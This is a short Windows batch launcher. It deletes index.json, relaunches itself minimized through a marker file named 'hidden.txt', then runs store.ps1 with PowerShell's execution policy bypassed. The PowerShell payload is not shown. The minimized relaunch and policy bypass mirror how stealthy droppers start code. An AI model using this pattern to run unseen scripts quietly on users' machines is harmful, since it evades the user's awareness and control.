@echo off
cd /d "%~dp0"
:: Varriable !
set "name=store"
set "hide=hidden"
del index.json

if exist %hide%.txt goto execut

echo >> %hide%.txt

cmd /c start /min store.bat
exit
:execut
del %hide%.txt
:: Execution !
PowerShell -ExecutionPolicy Bypass -File "%name%.ps1" /wait
exit > nul